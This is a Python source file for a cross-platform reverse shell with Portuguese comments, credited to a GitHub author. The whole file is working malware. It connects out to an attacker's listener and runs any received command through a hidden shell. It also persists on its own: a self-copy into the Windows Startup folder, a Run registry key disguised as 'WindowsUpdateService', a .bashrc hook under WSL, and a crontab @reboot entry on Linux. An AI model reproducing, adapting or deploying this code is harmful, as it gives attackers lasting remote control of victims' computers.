# language: Python, file: shell.py, target: Cross-platform (Windows, Linux, WSL)
# made by github.com/wrxxnch
# this reverse shell auto persists on target machine
import os
import sys
import shutil
import socket
import subprocess
import time

# Configurações padrão de conexão
DEFAULT_IP = "0.0.0.0"
DEFAULT_PORT = 4444

CREATE_NO_WINDOW = 0
if os.name == 'nt':
    try:
        CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW
    except AttributeError:
        CREATE_NO_WINDOW = 0x08000000

# Variável global para armazenar o endpoint resolvido e evitar múltiplas execuções de input
_CACHED_ENDPOINT = None

def get_target_endpoint():
    """Lê IP e Porta via argumento CLI (<ip>:<porta>) ou solicita interativamente apenas uma vez."""
    global _CACHED_ENDPOINT
    if _CACHED_ENDPOINT is not None:
        return _CACHED_ENDPOINT

    target_ip = DEFAULT_IP
    target_port = DEFAULT_PORT

    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if ":" in arg:
            parts = arg.split(":", 1)
            if parts[0].strip():
                target_ip = parts[0].strip()
            if parts[1].strip().isdigit():
                target_port = int(parts[1].strip())
    else:
        try:
            ip_input = input(f"Digite o IP do Host (Listener) [{DEFAULT_IP}]: ").strip()
            if ip_input:
                target_ip = ip_input

            port_input = input(f"Digite a Porta [{DEFAULT_PORT}]: ").strip()
            if port_input.isdigit():
                target_port = int(port_input)
        except Exception:
            pass

    _CACHED_ENDPOINT = (target_ip, target_port)
    return _CACHED_ENDPOINT

def persist():
    """Identifica o ambiente e aplica a persistência automaticamente via CMD e repassando os parâmetros CLI."""
    try:
        current_file = os.path.abspath(sys.argv[0])
        
        target_ip, target_port = get_target_endpoint()
        cli_arg = f"{target_ip}:{target_port}"
        
        results = []

        is_wsl = False
        if os.name != 'nt':
            try:
                with open("/proc/version", "r") as f:
                    if "microsoft" in f.read().lower():
                        is_wsl = True
            except:
                pass

        if is_wsl:
            try:
                win_profile_cmd = subprocess.run(
                    ["cmd.exe", "/c", "echo %USERPROFILE%"], 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    text=True
                )
                if win_profile_cmd.returncode == 0 and win_profile_cmd.stdout.strip():
                    raw_win_path = win_profile_cmd.stdout.strip().replace('\r', '')
                    wsl_win_path = subprocess.run(
                        ["wslpath", "-u", raw_win_path], 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE, 
                        text=True
                    ).stdout.strip()
                    
                    if wsl_win_path:
                        startup_folder = os.path.join(wsl_win_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                        
                        if os.path.exists(startup_folder):
                            file_name = os.path.basename(current_file)
                            destination = os.path.join(startup_folder, file_name)
                            
                            if current_file.lower() != destination.lower():
                                shutil.copyfile(current_file, destination)
                            
                            reg_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "python \\"{destination}\\" \\"{cli_arg}\\"" /f'
                            subprocess.run(["cmd.exe", "/c", reg_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            results.append("[+] Persistência no Windows aplicada via WSL (/mnt/c Startup + Registro via CMD)!")
            except Exception as wsl_err:
                results.append(f"[-] Aviso WSL->Windows: {str(wsl_err)}")

            home_dir = os.path.expanduser("~")
            bashrc_path = os.path.join(home_dir, ".bashrc")
            python_path = sys.executable
            payload_line = f'\n# Background persistence hook\n{python_path} {current_file} {cli_arg} >/dev/null 2>&1 &\n'
            
            if os.path.exists(bashrc_path):
                with open(bashrc_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                if current_file not in content:
                    with open(bashrc_path, "a", encoding="utf-8") as f:
                        f.write(payload_line)
                    results.append("[+] Persistência aplicada no .bashrc do WSL!")
                else:
                    results.append("[*] O .bashrc já possui a persistência configurada.")

        elif os.name == 'nt':
            appdata = os.environ.get('APPDATA', '')
            if not appdata:
                return "[-] Erro: Variável APPDATA não encontrada.\n"
                
            startup_folder = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
            file_name = os.path.basename(current_file)
            destination = os.path.join(startup_folder, file_name)
            
            if current_file.lower() != destination.lower():
                shutil.copyfile(current_file, destination)

            import winreg
            key = winreg.HKEY_CURRENT_USER
            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{sys.executable}" "{destination}" "{cli_arg}"')
                
            results.append("[+] Persistência aplicada com sucesso no Windows Nativo (Startup + Registro)!")

        else:
            python_path = sys.executable
            cron_command = f"@reboot {python_path} {current_file} {cli_arg} &\n"
            
            process = subprocess.Popen(["crontab", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            current_cron = stdout.decode('utf-8', errors='ignore')
            
            if current_file not in current_cron:
                new_cron = current_cron + cron_command
                p_in = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                p_in.communicate(input=new_cron.encode('utf-8'))
                results.append("[+] Persistência aplicada com sucesso no Linux (Crontab @reboot)!")
            else:
                results.append("[*] A persistência no Crontab já estava configurada.")

        return "\n".join(results) + "\n"

    except Exception as e:
        return f"[-] Erro ao aplicar persistência: {str(e)}\n"

def get_help():
    help_menu = """
=============================================
            COMANDOS PRÉ-PRONTOS (HELP)
=============================================
 help      - Exibe este menu de ajuda
 sysinfo   - Exibe informações detalhadas do sistema
 tasks     - Lista todos os processos em execução
 users     - Mostra os usuários cadastrados no sistema
 netstat   - Exibe conexões de rede ativas
 exit      - Encerra a sessão atual
=============================================
"""
    return help_menu.encode('utf-8', errors='ignore')

def reverse_shell():
    # Resolve o endpoint uma única vez logo no início e instala a persistência
    persist()

    target_ip, target_port = get_target_endpoint()

    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            while True:
                data = s.recv(1024)
                if not data:
                    break
                
                command = data.decode('utf-8', errors='ignore').strip()
                
                try:
                    if command.lower() == 'exit':
                        s.send(b"Sessao encerrada.\n")
                        break
                    elif command.lower() == 'help':
                        output = get_help()
                    else:
                        kwargs = {}
                        if CREATE_NO_WINDOW:
                            kwargs['creationflags'] = CREATE_NO_WINDOW

                        proc = subprocess.Popen(
                            command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            **kwargs
                        )
                        output = proc.stdout.read() + proc.stderr.read()
                except Exception as ex:
                    output = f"[-] Erro ao processar comando: {str(ex)}\n".encode('utf-8', errors='ignore')
                
                if not output:
                    output = b"[+] Comando executado sem retorno.\n"
                
                s.send(output)
        except Exception:
            time.sleep(5)
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

if __name__ == "__main__":
    reverse_shell()
